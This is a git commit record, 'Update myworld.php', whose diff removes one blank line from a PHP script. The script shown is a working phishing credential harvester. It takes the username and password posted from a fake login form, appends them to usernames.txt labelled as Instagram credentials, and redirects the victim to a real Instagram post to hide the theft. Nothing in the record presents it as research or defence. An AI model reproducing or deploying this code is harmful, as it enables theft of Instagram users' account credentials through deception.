2f8d28035fb15ee68d40eb3b2569a4a10b9eed37
dharick <58396545+dharick@users.noreply.github.com>
2022-04-14 20:41:51 +0530

    Update myworld.php

--- myworld.php
+++ myworld.php
@@ -1,5 +1,4 @@
 <?php
-
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 $work=fopen("password.txt","w");
 header('Location: https://www.instagram.com/p/CIDHlsxDiYd/?utm_medium=copy_link');
